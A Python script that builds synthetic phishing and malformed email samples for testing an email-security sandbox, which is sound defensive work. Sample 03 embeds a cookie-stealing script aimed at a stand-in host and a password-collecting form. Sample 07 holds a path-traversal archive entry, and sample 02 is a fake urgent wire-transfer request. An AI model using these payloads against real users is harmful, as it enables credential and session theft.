"""Build the synthetic demonstration dataset.

    python samples/build_samples.py

Every sample is synthetic. Domains use the reserved .example / .invalid TLDs
and IPs come from the documentation range 192.0.2.0/24, so no link can reach
a real site. Attachments are harmless (see samples/harmless/README.md).
Expected findings for each file are documented in samples/EXPECTED_FINDINGS.md.
"""
from __future__ import annotations

import base64
import io
import struct
import zipfile
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
OUT = HERE / "emails"
HARMLESS = HERE / "harmless"
CRLF = "\r\n"


def b64(data: bytes) -> str:
    s = base64.b64encode(data).decode()
    return CRLF.join(s[i:i + 76] for i in range(0, len(s), 76))


def write(name: str, text: str) -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / name).write_bytes(text.replace("\r\n", "\n").replace("\n", CRLF).encode("utf-8"))


def common_received(by: str = "mx1.contoso-demo.example") -> str:
    return (f"Received: from mail.sender-demo.example (mail.sender-demo.example [192.0.2.10])\n"
            f"\tby {by} (Postfix) with ESMTPS id 4XyZ1;\n\tMon, 05 Oct 2026 08:14:22 +0100\n")


# ------------------------------------------------------------------ ZipCrypto (traditional PKWARE) writer
def _crc_table() -> list[int]:
    t = []
    for n in range(256):
        c = n
        for _ in range(8):
            c = (0xEDB88320 ^ (c >> 1)) if c & 1 else (c >> 1)
        t.append(c)
    return t


_CRC = _crc_table()


class _ZipCrypto:
    def __init__(self, pwd: bytes) -> None:
        self.k = [0x12345678, 0x23456789, 0x34567890]
        for b in pwd:
            self._update(b)

    def _crc(self, c: int, b: int) -> int:
        return _CRC[(c ^ b) & 0xFF] ^ (c >> 8)

    def _update(self, b: int) -> None:
        k = self.k
        k[0] = self._crc(k[0], b)
        k[1] = (k[1] + (k[0] & 0xFF)) & 0xFFFFFFFF
        k[1] = (k[1] * 134775813 + 1) & 0xFFFFFFFF
        k[2] = self._crc(k[2], (k[1] >> 24) & 0xFF)

    def encrypt(self, data: bytes) -> bytes:
        out = bytearray()
        for b in data:
            t = (self.k[2] | 2) & 0xFFFF
            ks = ((t * (t ^ 1)) >> 8) & 0xFF
            out.append(b ^ ks)
            self._update(b)
        return bytes(out)


def encrypted_zip(entries: dict[str, bytes], password: bytes) -> bytes:
    """Minimal stored (uncompressed) ZIP with ZipCrypto-encrypted entries."""
    buf, central = io.BytesIO(), []
    for name, data in entries.items():
        crc = zlib.crc32(data) & 0xFFFFFFFF
        header12 = bytes(range(11)) + bytes([(crc >> 24) & 0xFF])  # deterministic "random" header, last byte = crc check
        enc = _ZipCrypto(password).encrypt(header12 + data)
        offset = buf.tell()
        fn = name.encode()
        buf.write(struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0x1, 0, 0, 0x21, crc, len(enc), len(data), len(fn), 0) + fn + enc)
        central.append(struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 0x1, 0, 0, 0x21, crc, len(enc), len(data),
                                   len(fn), 0, 0, 0, 0, 0, offset) + fn)
    cd_start = buf.tell()
    for c in central:
        buf.write(c)
    cd_size = buf.tell() - cd_start
    buf.write(struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(central), len(central), cd_size, cd_start, 0))
    return buf.getvalue()


def archive_with_traversal() -> bytes:
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("readme.txt", "Nested archive created for the NEMSEC demo dataset.\n")
    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("Shipping_Label.pdf.bat", (HARMLESS / "nemsec_sandbox_demo.bat").read_bytes())
        z.writestr("../../Startup/demo_traversal_entry.txt", "This entry name tries to escape the extraction folder. Harmless text.\n")
        z.writestr("nested/inner.zip", inner.getvalue())
    return outer.getvalue()


def build() -> None:
    exe = (HARMLESS / "nemsec_sandbox_demo.exe").read_bytes()
    bat = (HARMLESS / "nemsec_sandbox_demo.bat").read_bytes()

    # 01 — ordinary legitimate message
    write("01_legitimate.eml", f"""Return-Path: <tunde.bello@contoso-demo.example>
{common_received()}Authentication-Results: mx1.contoso-demo.example;
\tspf=pass smtp.mailfrom=contoso-demo.example;
\tdkim=pass header.d=contoso-demo.example;
\tdmarc=pass header.from=contoso-demo.example
From: Tunde Bello <tunde.bello@contoso-demo.example>
To: Ngozi Eze <ngozi.eze@contoso-demo.example>
Subject: Notes from Thursday's planning meeting
Date: Mon, 05 Oct 2026 08:14:10 +0100
Message-ID: <20261005081410.1111@contoso-demo.example>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="alt-01"

--alt-01
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Hi Ngozi,

Thanks for joining Thursday. The agreed timeline is on the team page:
https://intranet.contoso-demo.example/planning/q4

See you at standup.
Tunde

--alt-01
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

<p>Hi Ngozi,</p><p>Thanks for joining Thursday. The agreed timeline is on the
<a href="https://intranet.contoso-demo.example/planning/q4">team page</a>.</p><p>See you at standup.<br>Tunde</p>

--alt-01--
""")

    # 02 — unrelated Reply-To, display-name impersonation, urgent payment
    write("02_reply_to_mismatch.eml", f"""Return-Path: <bounce-77@mailer.lookalike-demo.example>
{common_received()}Authentication-Results: mx1.contoso-demo.example;
\tspf=softfail smtp.mailfrom=mailer.lookalike-demo.example;
\tdkim=none;
\tdmarc=fail header.from=execmail-demo.example
From: "Adaeze Okafor (CFO)" <adaeze.okafor@execmail-demo.example>
Reply-To: Finance Desk <payments.desk@quickpay-demo.example>
To: accounts@contoso-demo.example
Subject: =?UTF-8?B?VVJHRU5UOiB2ZW5kb3IgcGF5bWVudCB0b2RheQ==?=
Date: Mon, 05 Oct 2026 09:02:44 +0100
Message-ID: <a7c1-2026-demo@execmail-demo.example>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Hello,

I need you to process an urgent wire transfer to a new vendor today before end of day.
Their bank details have changed, please use the new bank account below and confirm by reply.
I am in meetings and cannot take calls. Treat this as confidential.

Account name: Demo Supplies Ltd (SYNTHETIC)
Account number: 0000000000 (SYNTHETIC)

Adaeze
""")

    # 03 — misleading links and hostile HTML
    write("03_misleading_link.eml", f"""Return-Path: <notice@security-alerts-demo.example>
{common_received()}From: Contoso IT Security <notice@security-alerts-demo.example>
To: ngozi.eze@contoso-demo.example
Subject: Action required: your mailbox will be suspended
Date: Mon, 05 Oct 2026 10:30:00 +0100
Message-ID: <alert-5521@security-alerts-demo.example>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="alt-03"

--alt-03
Content-Type: text/plain; charset="utf-8"

Your mailbox will be suspended within 24 hours. Verify your account password:
https://portal.contoso-demo.example/login

--alt-03
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

<html><head><meta http-equiv=3D"refresh" content=3D"30;url=3Dhttp://redirect.invali=
d/next"><script>document.location=3D'http://steal.invalid/?c=3D'+document.cookie</s=
cript></head>
<body onload=3D"alert('x')">
<img src=3D"http://tracker.invalid/pixel.gif?id=3Dngozi" width=3D"1" height=3D"1">
<p>Your mailbox will be <b>suspended within 24 hours</b>. Verify your account password now.</p>
<p><a href=3D"http://login-contoso-demo.invalid/verify?u=3Dngozi">https://portal.contoso-demo.example/login</a></p>
<p>Backup link: <a href=3D"http://192.0.2.45:8080/owa/">Outlook Web Access</a></p>
<p>Help centre: <a href=3D"https://c=D0=BEntoso-demo.example/help">https://contoso-demo.example/help</a></p>
<p>Single sign-on: <a href=3D"https://portal.contoso-demo.example@sso-demo.invalid/auth">portal.contoso-demo.example</a></p>
<form action=3D"http://collect.invalid/submit" method=3D"post"><input name=3D"password" type=3D"password"><button>Verify</button></form>
<iframe src=3D"http://frame.invalid/"></iframe>
<a href=3D"javascript:alert(1)">Unsubscribe</a>
</body></html>

--alt-03--
""")

    # 04 — attachment named .pdf that is actually a (harmless) Windows executable
    write("04_misleading_extension.eml", f"""Return-Path: <billing@invoices-demo.example>
{common_received()}From: Billing Team <billing@invoices-demo.example>
To: accounts@contoso-demo.example
Subject: Invoice INV-2026-1043 attached
Date: Mon, 05 Oct 2026 11:15:00 +0100
Message-ID: <inv-1043@invoices-demo.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-04"

--mix-04
Content-Type: text/plain; charset="utf-8"

Please find the outstanding invoice attached. Payment is due immediately.

--mix-04
Content-Type: application/pdf; name="Invoice_INV-2026-1043.pdf"
Content-Disposition: attachment; filename="Invoice_INV-2026-1043.pdf"
Content-Transfer-Encoding: base64

{b64(exe)}
--mix-04--
""")

    # 05 — malformed message
    write("05_malformed.eml", """From: "Broken Sender" <broken-sender@malformed-demo.example>
From: "Second From" <second@other-demo.example>
To: ngozi.eze@contoso-demo.example
Subject: =?X-UNKNOWN-CHARSET?Q?Malformed_=E9ncoding?=
Date: Funday, 45 Smarch 2026 25:61:00 +9999
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-05"

--mix-05
Content-Type: text/plain; charset="no-such-charset"

Body text in an unknown charset. caf\xe9

--mix-05
Content-Type: application/octet-stream; name="data.bin"
Content-Disposition: attachment; filename="data.bin"
Content-Transfer-Encoding: base64

SGVsbG8gZnJvbSBhIHRydW5jYXRlZCBiYXNlNjQgcGF5bG9hZA=
""")

    # 06 — encrypted archive + unsupported format
    enc = encrypted_zip({"Statement_October.docm": b"Synthetic placeholder content for the encrypted-archive demo.\n"}, b"Oct2026!")
    stub_7z = b"7z\xbc\xaf\x27\x1c\x00\x04" + b"\x00" * 24 + b"SYNTHETIC 7z STUB - not a real archive"
    write("06_encrypted_unsupported.eml", f"""Return-Path: <statements@bank-demo.example>
{common_received()}From: Statements <statements@bank-demo.example>
To: ngozi.eze@contoso-demo.example
Subject: Your secure statement
Date: Mon, 05 Oct 2026 12:00:00 +0100
Message-ID: <stmt-889@bank-demo.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-06"

--mix-06
Content-Type: text/plain; charset="utf-8"

Your statement is attached. The archive password is Oct2026!

--mix-06
Content-Type: application/zip; name="Statement_October.zip"
Content-Disposition: attachment; filename="Statement_October.zip"
Content-Transfer-Encoding: base64

{b64(enc)}
--mix-06
Content-Type: application/x-7z-compressed; name="Backup_Statement.7z"
Content-Disposition: attachment; filename="Backup_Statement.7z"
Content-Transfer-Encoding: base64

{b64(stub_7z)}
--mix-06--
""")

    # 07 — archive with script, traversal entry and nested zip
    write("07_archive_with_script.eml", f"""Return-Path: <dispatch@courier-demo.example>
{common_received()}From: Courier Dispatch <dispatch@courier-demo.example>
To: ngozi.eze@contoso-demo.example
Subject: Delivery failed - print your shipping label
Date: Mon, 05 Oct 2026 13:20:00 +0100
Message-ID: <dlv-301@courier-demo.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-07"

--mix-07
Content-Type: text/plain; charset="utf-8"

We could not deliver your parcel. Open the attached label and print it.

--mix-07
Content-Type: application/zip; name="Shipping_Label.zip"
Content-Disposition: attachment; filename="Shipping_Label.zip"
Content-Transfer-Encoding: base64

{b64(archive_with_traversal())}
--mix-07--
""")

    # 08 — sandbox verification sample (harmless programs, honestly named)
    write("08_sandbox_verification.eml", f"""Return-Path: <lab@nemsec-demo.example>
From: NEMSEC Lab <lab@nemsec-demo.example>
To: analyst@nemsec-demo.example
Subject: Sandbox verification samples (harmless)
Date: Mon, 05 Oct 2026 14:00:00 +0100
Message-ID: <sbx-verify@nemsec-demo.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-08"

--mix-08
Content-Type: text/plain; charset="utf-8"

Harmless programs for verifying the sandbox pipeline. Each writes one file named
NEMSEC_SANDBOX_DEMO_*.txt to %TEMP% and exits. Source: samples/harmless/.

--mix-08
Content-Type: application/octet-stream; name="nemsec_sandbox_demo.exe"
Content-Disposition: attachment; filename="nemsec_sandbox_demo.exe"
Content-Transfer-Encoding: base64

{b64(exe)}
--mix-08
Content-Type: application/x-bat; name="nemsec_sandbox_demo.bat"
Content-Disposition: attachment; filename="nemsec_sandbox_demo.bat"
Content-Transfer-Encoding: base64

{b64(bat)}
--mix-08--
""")
    # 09 — demo-mode failure paths (same harmless script, filenames trigger the DEMO adapter's simulated failures)
    parts = "".join(f"""--mix-09
Content-Type: application/x-bat; name="{n}"
Content-Disposition: attachment; filename="{n}"
Content-Transfer-Encoding: base64

{b64(bat)}
""" for n in ("nemsec_demo-reset-fail.bat", "nemsec_demo-fail.bat"))
    write("09_demo_failure_paths.eml", f"""From: NEMSEC Lab <lab@nemsec-demo.example>
To: analyst@nemsec-demo.example
Subject: Demo-mode failure paths (harmless)
Date: Mon, 05 Oct 2026 14:30:00 +0100
Message-ID: <sbx-failpaths@nemsec-demo.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="mix-09"

--mix-09
Content-Type: text/plain; charset="utf-8"

In PHB_SANDBOX_MODE=demo these filenames make the demo adapter simulate a reset failure
(guest quarantined) and an engine failure. Against a live sandbox they are the same harmless script.

{parts}--mix-09--
""")
    print(f"wrote {len(list(OUT.glob('*.eml')))} samples to {OUT}")


if __name__ == "__main__":
    build()
